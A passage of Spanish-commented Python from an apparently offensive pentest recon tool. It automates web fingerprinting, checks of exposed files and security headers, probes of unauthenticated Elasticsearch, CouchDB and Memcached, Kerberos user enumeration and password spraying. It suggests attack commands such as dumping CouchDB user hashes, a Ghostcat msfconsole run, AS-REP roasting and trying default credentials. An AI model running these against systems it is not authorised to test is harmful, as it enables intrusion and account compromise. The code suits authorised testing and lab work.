            return getattr(r, "status", r.getcode()), hdrs, r.read(max_bytes).decode("latin-1", "replace")
    except urllib.error.HTTPError as e:
        hdrs = {k.lower(): v for k, v in (e.headers.items() if e.headers else [])}
        return e.code, hdrs, ""
    except (urllib.error.URLError, OSError, ValueError):
        return None, {}, ""


def _web_file_hit(status, body, rx):
    """Un fichero sensible cuenta como hallazgo solo si el GET dio 200 Y el cuerpo
    casa con su regex de confirmación (descarta el 200-a-todo de IIS/Apache)."""
    return status == 200 and re.search(rx, body or "") is not None


def _dangerous_methods(allow):
    """Métodos peligrosos realmente presentes en la cabecera Allow de un OPTIONS."""
    up = (allow or "").upper()
    return [m for m in ("PUT", "DELETE", "TRACE", "CONNECT", "PROPFIND", "MKCOL", "COPY", "MOVE")
            if m in up]


# Cabeceras de seguridad a comprobar en la respuesta raíz: (clave en minúscula, etiqueta del
# hallazgo, severidad, por qué). HSTS solo tiene sentido sobre HTTPS (pedirla en HTTP puro no
# significa nada: ahí el downgrade YA es el estado normal). X-Frame-Options se trata APARTE en
# _missing_security_headers porque una CSP con 'frame-ancestors' la sustituye — no hace falta
# tener las dos, así que no puede ir en esta lista de "falta sí o sí".
_SECURITY_HEADERS = (
    ("strict-transport-security", "HSTS (Strict-Transport-Security)", "media",
     "fuerza HTTPS en el navegador; sin ella, un downgrade a HTTP o un atacante en la red "
     "puede servir la versión insegura sin que el navegador proteste", True),
    ("x-content-type-options", "X-Content-Type-Options", "info",
     "sin 'nosniff', el navegador puede reinterpretar un fichero como otro tipo MIME "
     "(p.ej. un .txt subido se sirve/ejecuta como script)", False),
    ("content-security-policy", "Content-Security-Policy", "info",
     "sin CSP, un XSS reflejado o almacenado tiene vía libre para cargar o ejecutar lo que quiera",
     False),
)


def _missing_security_headers(scheme, hdrs):
    """Cabeceras de seguridad HTTP ausentes de la respuesta raíz que SÍ importan en un pentest
    — nmap/whatweb no las convierten en hallazgo por su cuenta. Devuelve
    [(etiqueta, severidad, por_qué), …], en el mismo orden que _SECURITY_HEADERS y con
    X-Frame-Options/CSP frame-ancestors (si falta la combinación de las dos) al final.
    Puro → testable sin red."""
    hdrs = hdrs or {}
    out = [(label, sev, why) for key, label, sev, why, https_only in _SECURITY_HEADERS
           if not (https_only and scheme != "https") and key not in hdrs]
    csp = hdrs.get("content-security-policy", "")
    if "x-frame-options" not in hdrs and "frame-ancestors" not in csp.lower():
        out.append(("X-Frame-Options / CSP frame-ancestors", "media",
                     "sin ninguna de las dos, la página es embebible en un <iframe> ajeno → clickjacking"))
    return out


# wafw00f anuncia el WAF como "is behind X (Y) WAF"; a veces solo "(Y)" sin fabricante.
_WAFW00F_RE = re.compile(r"is behind\s+(.+?)\s+WAF", re.I)


def _wafw00f_waf(out):
    """Nombre del WAF detectado, o None (puro — testable sin red)."""
    m = _WAFW00F_RE.search(out or "")
    return m.group(1).strip() if m else None


_ROBOTS_PATH_RE = re.compile(r"(?mi)^\s*(?:Disallow|Allow)\s*:\s*(/\S*)")


def _robots_paths(body):
    """Rutas Disallow/Allow de un robots.txt, deduplicadas, en orden de aparición
    (puro — testable sin red). robots.txt es la forma más barata de que un vhost
    delate sus propias rutas 'ocultas' SIN fuzzing — hay que leerlo con el Host:
    correcto de cada vhost confirmado, no solo el del vhost por defecto."""
    seen, out = set(), []
    for m in _ROBOTS_PATH_RE.finditer(body or ""):
        path = m.group(1)
        if path not in seen:
            seen.add(path)
            out.append(path)
    return out


def fp_web_fast(ip, p, services, host, deep, hostname=None):
    """Mini-recon RÁPIDA de un servicio web: fingerprint de tecnología (whatweb) + lo
    que ya sacó nmap (cabeceras, título, métodos) + comprobaciones de solo lectura
    (OPTIONS, ficheros sensibles, .well-known). Si es IIS, nombres cortos 8.3 y
    WebDAV. Todo lectura y todo RÁPIDO (segundos) — los escáneres opt-in que de
    verdad tardan (nikto/nuclei/wpscan/joomscan/katana) van en fp_web_slow(), que
    corre aparte y DESPUÉS del informe HTML preliminar (ver footprint_web_slow()).

    `hostname`, si se conoce, se usa en vez de `ip` para construir la URL: detrás de
    un WAF/CDN con SNI (Cloudflare, p. ej.) pegarle a la IP desnuda sin el Host
    correcto devuelve un 403/bloqueo genérico para TODO (whatweb, wafw00f, los
    chequeos .git/.env, nikto, wpscan, katana... todos comparten esta `url`) y el
    footprint entero sale "limpio" por error, no porque no haya nada.

    Devuelve (res, whatweb_out): whatweb_out se le pasa luego a fp_web_slow() para
    detectar CMS sin tener que relanzar whatweb."""
    scheme = web_scheme(p)
    port = p["port"]
    target = hostname or ip
    url = f"{scheme}://{target}:{port}/"
    res = _fp("web", f"Web {scheme}://:{port}", [port])
    whatweb_out = ""
    if have("whatweb"):
        rc, whatweb_out = run_capture(["whatweb", "-a", "3", url], timeout=90)
        _step(res, f"whatweb -a 3 {url}", rc == 0, whatweb_out,
              note="fingerprint de tecnologías: CMS, framework, lenguaje y versiones del servidor web")
    else:
        res["missing"].append("whatweb")
    for lbl, txt in _nse_for([p], {}, ("http-",)):
        _step(res, f"nmap {lbl}", True, txt,
              note="cabeceras, título, robots.txt, métodos y favicon que ya recogió nmap")

    # wafw00f ANTES de fuzzear (Fase 6/7 vienen después en run_one): si hay WAF,
    # el fuzzing que sigue puede ir filtrado/bloqueado — mejor saberlo ya.
    if have("wafw00f"):
        rc, out = run_capture(["wafw00f", url], timeout=40)
        _step(res, f"wafw00f {url}", rc == 0, out,
              note="detecta si hay un WAF delante — el fuzzing de las Fases 5/6 puede ir más lento/bloqueado si lo hay")
        waf = _wafw00f_waf(out)
        if waf:
            res["findings"].append(("info", f"Web {port}: WAF detectado — {waf}"))
            res["next"].append("Si vas a fuzzear, usa --stealth (menos hilos + delay + UA de navegador) para no gastar el WAF")
    else:
        res["missing"].append("wafw00f")

    # Automatizado (SOLO LECTURA): métodos realmente permitidos + ficheros sensibles.
    status, hdrs, _body = _http_get(url, method="OPTIONS")
    allow = hdrs.get("allow", "")
    if allow:
        extra = f"\nDAV: {hdrs['dav']}" if hdrs.get("dav") else ""
        _step(res, f"OPTIONS {url}", True, f"Allow: {allow}{extra}",
              note="métodos HTTP que el servidor permite DE VERDAD (confirma PUT/DELETE/WebDAV, no solo lo anunciado)")
        dang = _dangerous_methods(allow)
        if hdrs.get("dav"):
            res["findings"].append(("alta", f"Web {port}: WebDAV activo (cabecera DAV: {hdrs['dav']}) → posible subida de webshell"))
        if "PUT" in dang:
            res["findings"].append(("alta", f"Web {port}: método PUT permitido (OPTIONS) → posible subida de ficheros"))
        elif dang:
            res["findings"].append(("info", f"Web {port}: métodos potencialmente peligrosos: {', '.join(dang)}"))

    # Cabeceras de seguridad (solo lectura, 1 GET a la raíz): nmap/whatweb no lo convierten en
    # hallazgo por su cuenta y es de lo más común en un pentest real. GET aparte del OPTIONS de
    # arriba porque algunos servidores solo aplican estas cabeceras vía middleware en GET/HEAD,
    # no en OPTIONS.
    status_root, hdrs_root, _body_root = _http_get(url)
    if status_root:
        missing_hdrs = _missing_security_headers(scheme, hdrs_root)
        _step(res, f"GET {url} (cabeceras de seguridad)", bool(missing_hdrs),
              ("Ausentes: " + ", ".join(lbl for lbl, _sev, _why in missing_hdrs)) if missing_hdrs
              else "Presentes todas las cabeceras de seguridad comprobadas",
              note="HSTS / X-Content-Type-Options / X-Frame-Options (o CSP frame-ancestors) / "
                   "Content-Security-Policy — ausentes es un hallazgo pasivo que nmap/whatweb no reportan solos")
        for label, sev, why_txt in missing_hdrs:
            res["findings"].append((sev, f"Web {port}: falta la cabecera {label} — {why_txt}"))

    checks = (WEB_SENSITIVE["aspnet"] if _is_iis(p) else []) + WEB_SENSITIVE["any"]
    for path, label, rx in checks:
        st, _h2, body = _http_get(f"{url}{path}")
        hit = _web_file_hit(st, body, rx)
        _step(res, f"GET {url}{path}", hit, f"HTTP {st}" + (("\n" + body[:400]) if hit else ""),
              note=f"comprobar (solo lectura) si está expuesto: {label}")
        if hit:
            sev = "alta" if any(k in path for k in ("web.config", ".git", ".env", "elmah", "trace")) else "media"
            res["findings"].append((sev, f"Web {port}: {label} — {url}{path}"))

    for path, label, rx in WEB_WELL_KNOWN:
        st, _h2, body = _http_get(f"{url}{path}")
        hit = _web_file_hit(st, body, rx)
        _step(res, f"GET {url}{path}", hit, f"HTTP {st}" + (("\n" + body[:400]) if hit else ""),
              note=f"URI .well-known (RFC 8615) — comprobar (solo lectura): {label}")
        if hit:
            res["findings"].append(("info", f"Web {port}: {label} — {url}{path}"))

    # Los escáneres LENTOS y opt-in (nikto/nuclei/wpscan/joomscan/katana) NO corren
    # aquí — van en fp_web_slow(), llamada aparte DESPUÉS del informe preliminar (ver
    # footprint_web_slow() en run_one). Si están APAGADOS, al menos dejamos la
    # sugerencia de "siguiente paso"; si están ENCENDIDOS no hace falta sugerir nada,
    # ya se sabe que van a correr dentro de un momento.
    if not NUCLEI:
        res["next"].append(f"palantir {ip} --nuclei --resume   # nuclei: plantillas de CVEs/exposiciones/misconfig (opt-in, no corre por defecto)")
    if not CRAWL:
        res["next"].append(f"palantir {ip} --crawl --resume   # crawling real con katana (enlaces/JS/formularios; opt-in, no corre por defecto)")
    cms = _detect_cms(whatweb_out)
    if cms in ("wordpress", "joomla") and not CMS_SCAN:
        _tool = "wpscan" if cms == "wordpress" else "joomscan"
        res["next"].append(f"palantir {ip} --cms-scan --resume   # {cms} detectado → {_tool} (plugins/temas/usuarios/vulns; opt-in)")

    # Producto reconocido por whatweb (Jenkins, Grafana, Tomcat, phpMyAdmin,
    # Webmin…) que no sea WordPress/Joomla (esos ya tienen su propia sugerencia
    # mejor dirigida arriba) ni un servidor/runtime genérico (_CREDS_SEARCH_IGNORE):
    # consulta AUTOMÁTICA en DefaultCreds-cheat-sheet — base de datos LOCAL
    # (TinyDB/JSON), nunca toca el objetivo ni la red, coste cero.
    prods = _whatweb_products(whatweb_out, exclude={"wordpress", "joomla"} | _CREDS_SEARCH_IGNORE)
    if prods:
        creds_bin = _creds_bin()
        if not creds_bin:
            res["missing"].append("creds")
        for prod in prods:
            if not creds_bin:
                res["next"].append(
                    f"creds search {prod}   # credenciales por defecto conocidas de {prod} "
                    "(DefaultCreds-cheat-sheet: pipx install defaultcreds-cheat-sheet)")
                continue
            rc, out = run_capture([creds_bin, "search", prod], timeout=15)
            rows = _parse_creds_search(out)
            _step(res, f"creds search {prod}", bool(rows), out,
                  note=f"credenciales por defecto conocidas de {prod} (DefaultCreds-cheat-sheet, consulta local — no toca el objetivo)")
            if rows:
                shown = ", ".join(f"{u or '<vacío>'}:{p or '<vacío>'}" for _pr, u, p in rows[:8])
                more = f" (+{len(rows) - 8} más)" if len(rows) > 8 else ""
                res["findings"].append(("media", f"{prod}: {len(rows)} credencial(es) por defecto conocida(s) — {shown}{more}"))
                u0, p0 = rows[0][1], rows[0][2]
                res["next"].append(f"Prueba {u0 or '<vacío>'}:{p0 or '<vacío>'} (y el resto de la tabla de arriba) en el panel de login de {prod}")

    if _is_iis(p):
        res["findings"].append(("info", f"Servidor IIS/ASP.NET en {port} → recon específico de IIS"))
        rc, out = run_capture(["nmap", "-p", str(port), "--script", "http-iis-short-name-brute",
                               "-oN", "-", ip], timeout=400)
        _step(res, f"nmap -p{port} --script http-iis-short-name-brute {ip}", rc == 0, out,
              note="IIS filtra nombres 8.3 (p.ej. SECRET~1.TXT): destapa ficheros/carpetas ocultos SIN diccionario")
        if re.search(r"Vulnerable|short name", out, re.I):
            res["findings"].append(("media", f"IIS {port}: enumeración de nombres cortos 8.3 (tilde) posible"))
        rc, out = run_capture(["nmap", "-p", str(port), "--script", "http-iis-webdav-vuln",
                               "-oN", "-", ip], timeout=120)
        _step(res, f"nmap -p{port} --script http-iis-webdav-vuln {ip}", rc == 0, out,
              note="comprueba si WebDAV está activo y permite listar/subir ficheros al servidor")
        res["next"] += [
            f"davtest -url {url}   # si hay WebDAV: qué extensiones se pueden subir (webshell)",
            f"curl -s {url}web.config ; curl -s {url}trace.axd ; curl -s {url}elmah.axd   # ficheros típicos de ASP.NET",
        ]
    elif not NIKTO:
        res["next"].append(f"nikto -h {url}   # escaneo de problemas web conocidos (o relanza con --nikto para que lo haga solo)")
    return res, whatweb_out


def fp_web_slow(ip, p, res, whatweb_out, host, deep, hostname=None):
    """Escáneres web LENTOS y opt-in (--nikto/--nuclei/--cms-scan/--crawl): cada uno
    puede tardar varios minutos. Se llaman aparte y DESPUÉS del informe HTML
    preliminar (ver footprint_web_slow() en run_one) para no bloquearlo con algo que
    puede ser la parte más lenta de todo el recon. Muta `res` (el footprint que ya
    dejó fp_web_fast()) en su sitio — no crea uno nuevo ni devuelve nada."""
    scheme = web_scheme(p)
    port = p["port"]
    target = hostname or ip
    url = f"{scheme}://{target}:{port}/"

    if NIKTO:
        if have("nikto"):
            info(f"nikto contra {url} — puede tardar VARIOS MINUTOS (escaneo completo de vulnerabilidades/configuración conocidas)")
            rc, out = run_capture(["nikto", "-h", url, "-ask", "no"], timeout=1200)
            _step(res, f"nikto -h {url}", rc == 0, out,
                  note="escaneo completo de vulnerabilidades/configuración conocidas (--nikto: opt-in, lento — varios minutos)")
            m = re.search(r"(\d+)\s+item\(s\)\s+reported\s+on\s+remote\s+host", out)
            n_items = int(m.group(1)) if m else 0
            if n_items:
                res["findings"].append(("media", f"Nikto {port}: {n_items} ítem(s) reportados (detalle completo en los pasos de esta sección)"))
        else:
            res["missing"].append("nikto")

    if NUCLEI:
        if have("nuclei"):
            info(f"nuclei contra {url} — plantillas de la comunidad, puede tardar varios minutos")
            # -or (sin req/resp, salida compacta), -silent/-nc (solo hallazgos, sin color),
            # severidad low+ (se descarta el ruido 'info' de detección de tecnología).
            cmd = ["nuclei", "-u", url, "-jsonl", "-silent", "-nc", "-or",
                   "-severity", "low,medium,high,critical", "-timeout", "10"]
            # Si las plantillas ya están en disco, -duc salta el update-check de cada run
            # (no toca la red — útil tras la VPN de HTB). Si NO están, se omite para que
            # nuclei las autodescargue esta primera vez (necesita internet).
            if _nuclei_templates_present():
                cmd.append("-duc")
            rc, out = run_capture(cmd, timeout=1800)
            _step(res, shlex.join(cmd), rc == 0, out,
                  note="nuclei: plantillas de la comunidad (CVEs, exposiciones, misconfig) — --nuclei: opt-in, lento/ruidoso")
            hits = _nuclei_summary(out)
            if hits:
                worst = hits[0]["sev"]
                res["findings"].append((worst,
                    f"Nuclei {port}: {len(hits)} hallazgo(s) de plantilla (peor: {hits[0]['raw']}) — detalle en los pasos"))
                for h in hits[:25]:
                    res["findings"].append((h["sev"],
                        f"Nuclei {port}: [{h['raw']}] {h['id']}{(' — ' + h['name']) if h['name'] else ''} ({h['at']})"))
            elif _NUCLEI_NO_TPL_RE.search(out):
                # nuclei corrió pero no tenía plantillas (típico de -duc en la 1ª vez, o un
                # objetivo offline donde no pudo autodescargarlas). Avisamos con el fix.
                warn("nuclei no tiene plantillas descargadas — corre 'nuclei -update-templates' "
                     "una vez (con internet) y reintenta con --nuclei.")
                res["next"].append("nuclei -update-templates   # descarga las plantillas de nuclei (una vez, necesita internet)")
        else:
            res["missing"].append("nuclei")

    cms = _detect_cms(whatweb_out)
    if CMS_SCAN and cms == "wordpress":
        if have("wpscan"):
            info(f"wpscan contra {url} — puede tardar varios minutos")
            rc, out = run_capture(["wpscan", "--url", url, "--no-banner", "--random-user-agent",
                                   "-e", "vp,vt,u", "-f", "json"], timeout=600)
            _step(res, f"wpscan --url {url} -e vp,vt,u -f json", rc == 0, out,
                  note="WPScan: versión/plugins/temas/usuarios + vulnerabilidades conocidas (--cms-scan: opt-in)")
            summary = _wpscan_summary(out)
            if summary:
                if summary["total_vulns"]:
                    comps_s = "; ".join(f"{n} ({c} vuln)" for n, c in summary["components"][:5])
                    res["findings"].append(("alta", f"WPScan {port}: {summary['total_vulns']} vulnerabilidad(es) conocida(s) — {comps_s}"))
                if summary["users"]:
                    res["findings"].append(("media", f"WPScan {port}: usuarios enumerados — {', '.join(summary['users'][:10])}"))
        else:
            res["missing"].append("wpscan")
    elif CMS_SCAN and cms == "joomla":
        if have("joomscan"):
            info(f"joomscan contra {url} — puede tardar varios minutos")
            rc, out = run_capture(["joomscan", "--url", url], timeout=600)
            _step(res, f"joomscan --url {url}", rc == 0, out,
                  note="JoomScan: versión/componentes/vulnerabilidades conocidas de Joomla (--cms-scan: opt-in)")
            n = len(re.findall(r"(?i)\bvulnerability\b|\bCVE-\d{4}-\d+\b", out))
            if n:
                res["findings"].append(("alta", f"JoomScan {port}: {n} referencia(s) a vulnerabilidad en la salida (revisar detalle en los pasos)"))
        else:
            res["missing"].append("joomscan")

    if CRAWL:
        if have("katana"):
            info(f"katana contra {url} — crawling real, puede tardar hasta un par de minutos")
            cmd = ["katana", "-u", url, "-d", "2", "-jc", "-fx", "-kf", "all",
                   "-mdp", "60", "-or", "-ob", "-silent", "-jsonl", "-timeout", "10"]
            rc, out = run_capture(cmd, timeout=180)
            _step(res, shlex.join(cmd), rc == 0, out,
                  note="crawling real: sigue enlaces/JS/formularios de verdad (no adivina rutas como ffuf) — --crawl: opt-in")
            crawled = _parse_katana_jsonl(out)
            if crawled["urls"]:
                js = sum(1 for u in crawled["urls"] if u.split("?")[0].endswith(".js"))
                res["findings"].append(("info", f"Katana {port}: {len(crawled['urls'])} URL(s)/endpoint(s) reales descubiertos ({js} .js) — ver detalle en los pasos"))
                sensitive = [u for u in crawled["urls"] if re.search(r"(?i)(\.git|\.env\b|backup|/api/|admin|config|\.sql\b|\.bak\b)", u)]
                if sensitive:
                    res["findings"].append(("media", f"Katana {port}: {len(sensitive)} URL(s) con pinta interesante — {', '.join(sensitive[:5])}"))
                if crawled["forms"]:
                    res["findings"].append(("info", f"Katana {port}: formularios en {len(crawled['forms'])} URL(s) — superficie de entrada de datos"))

                # katana no guarda el body (-or -ob: una página pequeña ya pesaba
                # 585KB de JSON sin esto) así que para emails/comentarios HTML hay
                # que re-pedir las URLs descubiertas (acotado a 40) y pasarles regex
                # — lo que hace ReconSpider con Scrapy, sin añadir esa dependencia.
                all_emails, all_comments = set(), []
                for u in crawled["urls"][:40]:
                    _cst, _ch, cbody = _http_get(u)
                    em, co = _extract_emails_comments(cbody)
                    all_emails.update(em)
                    for c in co:
                        if (u, c) not in all_comments:
                            all_comments.append((u, c))
                if all_emails:
                    res["findings"].append(
                        ("media", f"Katana {port}: email(s) crawleados — {', '.join(sorted(all_emails)[:10])}"))
                if all_comments:
                    res["findings"].append(
                        ("alta", f"Katana {port}: {len(all_comments)} comentario(s) HTML — " +
                                 "; ".join(f"{u}: {sanitize(c)[:150]}" for u, c in all_comments[:5])))
        else:
            res["missing"].append("katana")


def fp_elastic(ip, ports, services, host, deep):
    """Elasticsearch (9200): por defecto sin autenticación → lectura de todos los
    índices (datos, a veces credenciales). Comprobación read-only con urllib."""
    res = _fp("elastic", "Elasticsearch", [p["port"] for p in ports])
    for p in ports:
        port = p["port"]
        scheme = "https" if p.get("tunnel") == "ssl" else "http"
        st, _hd, body = _http_get(f"{scheme}://{ip}:{port}/")
        _step(res, f"GET {scheme}://{ip}:{port}/", st == 200, (body or f"HTTP {st}")[:1200],
              note="banner de Elasticsearch (versión/cluster) sin autenticar")
        if st == 200 and ("cluster_name" in (body or "") or "lucene_version" in (body or "")):
            res["findings"].append(("critica", f"Elasticsearch {port}: accesible SIN autenticación"))
            st2, _h2, idx = _http_get(f"{scheme}://{ip}:{port}/_cat/indices?v")
            if st2 == 200 and idx.strip():
                _step(res, f"GET {scheme}://{ip}:{port}/_cat/indices?v", True, idx[:2000], note="índices disponibles")
        res["next"] += [
            f"curl -s {scheme}://{ip}:{port}/_cat/indices?v   # listar índices",
            f"curl -s '{scheme}://{ip}:{port}/_search?pretty&size=100'   # volcar documentos",
        ]
    return res


def fp_couchdb(ip, ports, services, host, deep):
    """CouchDB (5984): sin autenticación expone todas las bases; vigila CVE-2017-12635
    (privesc) y CVE-2017-12636 (RCE). Comprobación read-only con urllib."""
    res = _fp("couchdb", "CouchDB", [p["port"] for p in ports])
    for p in ports:
        port = p["port"]
        scheme = "https" if p.get("tunnel") == "ssl" or port == 6984 else "http"
        st, _hd, body = _http_get(f"{scheme}://{ip}:{port}/")
        _step(res, f"GET {scheme}://{ip}:{port}/", st == 200, (body or f"HTTP {st}")[:800], note="banner de CouchDB")
        if st == 200 and "couchdb" in (body or "").lower():
            st2, _h2, dbs = _http_get(f"{scheme}://{ip}:{port}/_all_dbs")
            if st2 == 200 and dbs.strip().startswith("["):
                res["findings"].append(("critica", f"CouchDB {port}: accesible SIN autenticación (_all_dbs responde)"))
                _step(res, f"GET {scheme}://{ip}:{port}/_all_dbs", True, dbs[:1500], note="bases de datos")
        res["next"] += [
            f"curl -s {scheme}://{ip}:{port}/_all_dbs   # listar bases",
            f"curl -s '{scheme}://{ip}:{port}/_users/_all_docs?include_docs=true'   # usuarios/hashes",
            f"# CVE-2017-12636: RCE vía _config si tienes admin (o CVE-2017-12635 para ganarlo)",
        ]
    return res


def fp_memcached(ip, ports, services, host, deep):
    """Memcached (11211/tcp): sin autenticación → volcado de la caché (sesiones,
    objetos). Lectura directa por socket con el comando 'stats'."""
    res = _fp("memcached", "Memcached", [p["port"] for p in ports])
    for p in ports:
        port = p["port"]
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(6)
                s.connect((ip, port))
                s.sendall(b"stats\r\n")
                data = s.recv(4096).decode("latin-1", "replace")
        except OSError as e:
            data = f"error: {e}"
        ok = "STAT " in data
        _step(res, f"stats @ {ip}:{port} (socket)", ok, data[:2000], note="estadísticas sin autenticar (versión, nº de items)")
        if ok:
            res["findings"].append(("alta", f"Memcached {port}: accesible SIN autenticación (stats responde)"))
        res["next"] += [
            f"printf 'stats items\\r\\n' | nc {ip} {port}   # slabs con items",
            f"printf 'stats cachedump <slab> 100\\r\\n' | nc {ip} {port}   # claves → get <clave>",
        ]
    return res


def fp_ajp(ip, ports, services, host, deep):
    """AJP (8009): conector de Tomcat. Objetivo típico = Ghostcat (CVE-2020-1938):
    leer/incluir ficheros del webroot (web.xml, y RCE si se puede subir un JSP)."""
    port = ports[0]["port"]
    res = fp_generic("ajp", "AJP (Tomcat)", ip, ports, services, host, ("ajp",), [
        f"nmap -p{port} --script ajp-headers,ajp-methods {ip}",
        f"# Ghostcat (CVE-2020-1938) — leer el webroot (Tomcat < 9.0.31/8.5.51/7.0.100):",
        f"msfconsole -q -x 'use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS {ip}; set RPORT {port}; run; exit'",
    ])
    res["findings"].append(("media", f"AJP expuesto ({port}) — revisar Ghostcat (CVE-2020-1938)"))
    return res


def fp_rmi(ip, ports, services, host, deep):
    """Java RMI (1099): registro de objetos remotos; vector de deserialización Java."""
    port = ports[0]["port"]
    res = fp_generic("rmi", "Java RMI", ip, ports, services, host, ("rmi",), [
        f"nmap -p{port} --script rmi-dumpregistry,rmi-vuln-classloader {ip}",
        f"java -jar BaRMIe.jar -enum {ip} {port}   # enumerar objetos RMI expuestos",
        f"# Deserialización: ysoserial + el gadget adecuado si hay endpoint vulnerable",
    ])
    res["findings"].append(("media", f"Java RMI expuesto ({port}) — objetos remotos / deserialización Java"))
    return res


def _merge_write_ad_users(base, users):
    """Escribe <base>/ad_users.txt MEZCLANDO con lo que ya hubiera, en vez de pisarlo entero.
    Dos fuentes DISTINTAS escriben a este mismo fichero: kerbrute (Fase 5, adivina cuentas
    por wordlist contra Kerberos pre-auth) y la enum AD con credencial ya validada (Fase 5d,
    `--users`/`--rid-brute` por SMB/LDAP — consulta directa y autoritativa, normalmente un
    superset de lo que adivinó kerbrute). Antes cada una usaba `write_text` a secas: la
    segunda en escribir BORRABA la lista de la primera entera — bug real reportado por el
    operador ("me da 256 usuarios válidos si solo han sido 56 [por kerbrute]"): kerbrute
    escribió 56, y al validarse una credencial, `--rid-brute`/`--users` encontró el dominio
    COMPLETO (256 cuentas reales, incluidas las que kerbrute nunca adivinó con su wordlist) y
    sustituyó el fichero entero sin avisar — nada "falso", pero perder de vista de dónde salía
    cada número confundía más que ayudaba. Ahora se MEZCLA: se lee lo que ya hay, se une con lo
    nuevo y se escribe deduplicado (case-insensitive — en AD 'Fiona' y 'fiona' son la MISMA
    cuenta). Nunca lanza (igual que los `write_text` que reemplaza, ambos ya iban en un
    try/except OSError en el llamante)."""
    path = Path(base) / "ad_users.txt"
    existing = []
    if path.is_file():
        try:
            existing = [l.strip() for l in path.read_text(encoding="utf-8", errors="replace").splitlines() if l.strip()]
        except OSError:
            pass
    merged = _dedup_ci(existing + list(users))
    path.write_text("\n".join(merged) + "\n", encoding="utf-8")
    return merged


def _kerbrute_userenum(res, ip, domain, base):
    """Fase 5: enum de usuarios AD por Kerberos con kerbrute, de verdad (no solo sugerido)
    — es justo el fallback que saca usuarios cuando la superficie anónima (SMB null/LDAP
    anónimo) está capada, el caso típico de un DC endurecido. SOLO LECTURA y SIN riesgo de
    bloqueo: `kerbrute userenum` manda un AS-REQ por nombre y mira si el KDC responde
    'principal desconocido' o 'requiere pre-auth' — NO prueba contraseñas, NO incrementa
    badPwdCount, NO bloquea cuentas (a diferencia de passwordspray). Necesita el dominio AD
    (FQDN) y una wordlist; en automático prueba jsmith.txt (nombres de empleado realistas,
    minutos) si está instalada, si no cae a una shortlist genérica (segundos) — ver
    _userenum_wordlist. Con --userenum-wordlist se le pasa una grande a conciencia. Los
    usuarios hallados se vuelcan a <base>/ad_users.txt (listos para AS-REP roast / spray) y los
    '(sin pre-auth)' se marcan como AS-REP roastables (hash crackeable sin credenciales)."""
    import tempfile
    kb = _kerbrute_bin()
    if not kb:
        res["missing"].append("kerbrute")
        return
    if NO_USERENUM:
        res["next"].append(f"kerbrute userenum -d {domain} --dc {ip} <wordlist>   # (--no-userenum: no lo lancé) enum de usuarios por Kerberos, no bloquea cuentas")
        return
    wl = _userenum_wordlist(USERENUM_WORDLIST)
    if not wl:
        res["next"].append(f"kerbrute userenum -d {domain} --dc {ip} jsmith.txt   # enum de usuarios por Kerberos con nombres de empleado realistas: "
                            "https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jsmith.txt "
                            "— guárdala en /usr/share/wordlists/statistically-likely-usernames/jsmith.txt y la próxima vez la uso solo, sin --userenum-wordlist")
        return
    info(f"Kerberos: enum de usuarios con kerbrute ({Path(wl).name}) — no bloquea cuentas, puede tardar según la lista")
    kb_timeout = _kerbrute_timeout(wl)   # depende de CUÁL lista se use, no solo de si es --userenum-wordlist (ver _kerbrute_timeout)
    outf = tempfile.NamedTemporaryFile("w", delete=False, suffix=".kerb"); outf.close()
    try:
        rc, out = run_capture([kb, "userenum", "-d", domain, "--dc", ip, "-o", outf.name, wl],
                              timeout=kb_timeout, quiet=True)
    finally:
        try:
            os.unlink(outf.name)
        except OSError:
            pass
    users, noauth = _parse_kerbrute_users(out)
    _step(res, f"kerbrute userenum -d {domain} --dc {ip} {wl}", bool(users), out,
          note="enum de usuarios AD por Kerberos pre-auth (solo lectura, no bloquea cuentas)")
    if users:
        res["findings"].append(("alta", f"Kerberos: {len(users)} usuario(s) AD válidos por kerbrute"
                                + (f" (→ {base / 'ad_users.txt'})" if base else "") + ": "
                                + ", ".join(users[:20]) + (" …" if len(users) > 20 else "")))
        if base:
            try:
                _merge_write_ad_users(base, users)
            except OSError:
                pass
        res["next"].append(f"{_impacket_suggest_bin('GetNPUsers')} {domain}/ -usersfile ad_users.txt -no-pass -dc-ip {ip}   # AS-REP roast de los usuarios hallados")
    if noauth:
        res["findings"].append(("alta", f"Kerberos: {len(noauth)} cuenta(s) SIN pre-auth (AS-REP roastables, hash crackeable sin credenciales): "
                                + ", ".join(noauth[:10])))


def _parse_kerbrute_spray(out):
    """Usuarios cuya contraseña VALIDÓ en la salida de `kerbrute passwordspray`: líneas
    '[+] VALID LOGIN:  user@dominio:contraseña' (se queda con el usuario; la contraseña ya la
    conoces, es la que rociaste). Tolera color ANSI. Formato confirmado en el repo de kerbrute
    (ropnop/kerbrute). Puro → testeable sin red."""
    users = []
    for line in (out or "").splitlines():
        clean = _ANSI_RE.sub("", line)
        m = re.search(r"VALID LOGIN:\s*([^\s@:]+)", clean)
        if m:
            users.append(m.group(1))
    return list(dict.fromkeys(users))


def _read_ad_users(base):
    """Usuarios AD descubiertos EN VIVO (<base>/ad_users.txt), uno por línea — lo pueblan el
    kerbrute userenum (fp_kerberos) y la enum SMB/LDAP (_surface_ad_enum). [] si no hay fichero
    o base es None."""
    if not base:
        return []
    try:
        txt = (Path(base) / "ad_users.txt").read_text(encoding="utf-8", errors="replace")
    except OSError:
        return []
    return [l.strip() for l in txt.splitlines() if l.strip()]


def _spray_phase(ip, domain, base, services):
    """Fase de password spraying AUTOMÁTICO (--spray): rocía la(s) contraseña(s) dada(s) contra
    los usuarios AD que palantir YA descubrió en vivo (<base>/ad_users.txt), con
    `kerbrute passwordspray --safe`. SIN -u: los usuarios los saca palantir. OJO: una pre-auth
    fallida SÍ cuenta como login fallido y PUEDE bloquear cuentas — por eso --safe (kerbrute
    aborta en cuanto ve un bloqueo) y el aviso fuerte. Devuelve un footprint para el informe, o
    None si no aplica (no es un DC). El password spraying por Kerberos solo tiene sentido contra
    un DC. Las contraseñas se ENMASCARAN en el informe/commands.log (igual que --pass); los
    aciertos user:pass se enseñan EN PANTALLA (good(), no se persiste)."""
    if not is_domain_controller(services):
        return None
    res = _fp("spray", "Password Spraying (--spray)", [])
    if not domain:
        res["findings"].append(("info",
            "Password spraying: dominio AD no resuelto en este punto → no lanzo el spray "
            "(pásalo con -D DOMINIO)."))
        return res
    kb = _kerbrute_bin()
    if not kb:
        res["missing"].append("kerbrute")
        res["next"].append(
